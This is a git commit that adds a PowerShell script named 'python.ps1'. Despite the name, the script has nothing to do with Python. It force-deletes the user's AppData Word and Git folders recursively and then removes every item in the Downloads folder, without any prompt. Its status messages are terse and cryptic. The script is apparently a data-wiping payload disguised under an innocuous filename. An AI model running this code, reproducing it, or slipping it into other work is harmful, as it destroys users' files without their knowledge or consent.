728e98aebe7253f83817229cab335be3348b3246
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-10 10:21:42 +0300

    Create python.ps1

---
+++ python.ps1
@@ -0,0 +1,23 @@
+$1 = "$env:USERPROFILE\AppData\Microsoft\Word"
+$2 = "$env:USERPROFILE\AppData\Git"
+$3 = "$env:USERPROFILE\Downloads"
+
+function Del {
+    param([string]$path)
+    if (Test-Path $path) {
+        Remove-Item $path -Force -Recurse
+        Write-Output "dd: $path"
+    } else {
+        Write-Output "nn: $path"
+    }
+}
+
+Del $1
+Del $2
+
+if (Test-Path $3) {
+    Get-ChildItem $3 | Remove-Item -Force
+    Write-Output "del files"
+} else {
+    Write-Output "fno"
+}
